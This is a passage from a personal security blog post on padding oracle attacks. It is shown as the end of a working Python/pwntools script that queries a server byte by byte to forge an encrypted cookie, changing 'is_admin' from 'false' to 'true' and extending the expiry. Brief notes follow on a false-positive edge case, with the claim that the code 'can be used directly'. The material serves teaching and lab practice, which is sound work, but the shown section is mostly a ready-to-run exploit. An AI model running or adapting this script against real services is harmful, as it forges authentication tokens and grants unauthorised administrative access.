class="literal">True</span></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            previous_block = <span class="built_in">bytearray</span>(cipher_blocks[block_idx - <span class="number">1</span>])</span><br><span class="line">            <span class="comment"># Prepare known padding bytes</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(byte_pos + <span class="number">1</span>, block_size):</span><br><span class="line">                previous_block[k] = intermediate_bytes[k] ^ padding_value</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Try each possible byte value</span></span><br><span class="line">            have_found_byte = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                previous_block[byte_pos] = guess</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Construct full test cipher</span></span><br><span class="line">                test_cipher = <span class="built_in">bytearray</span>()</span><br><span class="line">                test_cipher.extend(previous_block)</span><br><span class="line">                test_cipher.extend(current_block)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Send the test blocks to server</span></span><br><span class="line">                conn = connect()</span><br><span class="line">                conn.sendline(test_cipher.<span class="built_in">hex</span>().encode())  <span class="comment"># Send as hex string</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    response = conn.recvline().decode().strip()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    response = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                conn.close()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Check if padding is valid</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">not</span> response) <span class="keyword">or</span> (response <span class="keyword">and</span> <span class="string">&quot;invalid&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response):</span><br><span class="line">                    <span class="comment"># Valid and Calculate intermediate byte</span></span><br><span class="line">                    intermediate_bytes[byte_pos] = guess ^ padding_value</span><br><span class="line">                    have_found_byte = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;create_cipher.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found byte <span class="subst">&#123;byte_pos&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(guess)&#125;</span>, interm:<span class="subst">&#123;<span class="built_in">hex</span>(intermediate_bytes[byte_pos])&#125;</span>&quot;</span>,</span><br><span class="line">                              file=f, flush=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># If we didn&#x27;t find a valid byte, something went wrong</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> have_found_byte:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">f&quot;Failed to find valid byte at position <span class="subst">&#123;byte_pos&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Calculate cipher_text block using intermediate bytes and previous cipher block</span></span><br><span class="line">        encrypted_block = <span class="built_in">bytearray</span>(block_size)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(block_size):</span><br><span class="line">            encrypted_block[i] = intermediate_bytes[i] ^ plain_blocks[block_idx - <span class="number">1</span>][i]</span><br><span class="line">            cipher_blocks[block_idx - <span class="number">1</span>][i] = encrypted_block[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add decrypted block to cipher_text</span></span><br><span class="line">        cipher_text[(block_idx - <span class="number">1</span>) * <span class="number">16</span>:block_idx * <span class="number">16</span>] = encrypted_block</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Log decrypted block</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;create_cipher.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">f&quot;Encrypted block <span class="subst">&#123;block_idx&#125;</span>: <span class="subst">&#123;encrypted_block.<span class="built_in">hex</span>()&#125;</span>, Intermediate bytes: <span class="subst">&#123;intermediate_bytes.<span class="built_in">hex</span>()&#125;</span>\n blocks:<span class="subst">&#123;cipher_blocks&#125;</span>&quot;</span>,</span><br><span class="line">                file=f, flush=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Main execution</span></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"><span class="comment"># old plain: &#123;&quot;username&quot;: &quot;guest&quot;, &quot;expires&quot;: &quot;2000-01-07&quot;, &quot;is_admin&quot;: &quot;false&quot;&#125;</span></span><br><span class="line">new_plain = pad(<span class="string">&#x27;&#123;&quot;username&quot;: &quot;guest&quot;, &quot;expires&quot;: &quot;2030-11-11&quot;, &quot;is_admin&quot;: &quot;true&quot;&#125;&#x27;</span>)</span><br><span class="line">new_plain = new_plain.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(new_plain)</span><br><span class="line"></span><br><span class="line">result = padding_oracle_attack(new_plain)</span><br><span class="line"></span><br><span class="line">result = result.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFinal result (hex):&quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;create_cipher.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final result (hex):<span class="subst">&#123;result&#125;</span>&quot;</span>, file=f, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>I encountered a minor issue worth noting. If the end of the decrypted content needs to match the old cookie value, false positives can occur. Specifically, the decrypted hex might still be the old ciphertext.</p>
<p>Therefore, when cracking the last byte of the (n-1) block, we need to consider two possible scenarios. This code already accounts for this situation and can be used directly.</p>
<p>In more technical terms:</p>
<ul>
<li>When performing a padding oracle attack, the verification of the last byte in a block can be ambiguous</li>
<li>If the expected padding at the end matches a pattern that already exists in the old cookie, the decryption might<br>appear successful but actually return the original ciphertext</li>
<li>The solution is to test both possibilities when cracking the final byte of each (n-1) block</li>
<li>The implementation already handles this edge case correctly</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://wenyunw.me">Wenyun Wang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://wenyunw.me/2025/03/15/padding-oracle-attack/">http://wenyunw.me/2025/03/15/padding-oracle-attack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/crypto/">crypto</a></div><div class="post_share"><div class="social-share" data-image="/images/padding_oracle_attack.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/19/Nmap/" title="Nmap"><img class="cover" src="/images/Nmap.png" onerror="onerror=null;src='/images/404_pic.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Nmap</div></div></a></div><div class="next-post pull-right"><a href="/2025/03/15/picoCTF/" title="picoCTF-Web Exploitation"><img class="cover" src="/images/picoctf.png" onerror="onerror=null;src='/images/404_pic.png'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">picoCTF-Web Exploitation</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Wenyun Wang</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/willowwy" target="_blank" title="Github"><i class="fab fa-github" style="color: #1e3050;"></i></a><a class="social-icon" href="mailto:wenyunw@andrew.cmu.edu" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #1e3050;"></i></a><a class="social-icon" href="https://www.google.com/maps/place/The+Information+Networking+Institute/@40.4460669,-79.9486752,19z/data=!3m1!4b1!4m6!3m5!1s0x8834f2246db2baff:0x85b7d021fa341b37!8m2!3d40.4460659!4d-79.9480315!16s%2Fm%2F03nrl47?entry=ttu&amp;g_ep=EgoyMDI0MDgyOC4wIKXMDSoASAFQAw%3D%3D" target="_blank" title="Location"><i class="fas fa-location-arrow" style="color: #1e3050;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/wenyunw/" target="_blank" title="Linkedin"><i class="fab fa-linkedin" style="color: #1e3050;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm seeking an full-time now.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-it-is-a-Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">Why it is a Vulnerability?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Decrypting"><span class="toc-number">2.</span> <span class="toc-text">Decrypting:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Encrypting"><span class="toc-number">3.</span> <span class="toc-text">Encrypting</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Wenyun Wang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>function loadWaline () {
  function initWaline () {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'comment.wenyunw.me',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  if (typeof Waline === 'object') initWaline()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/@waline/client@2/dist/waline.css').then(() => {
      getScript('https://cdn.jsdelivr.net/npm/@waline/client@2/dist/waline.min.js').then(initWaline)
    })
  }
}

if ('Waline' === 'Waline' || !false) {
  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>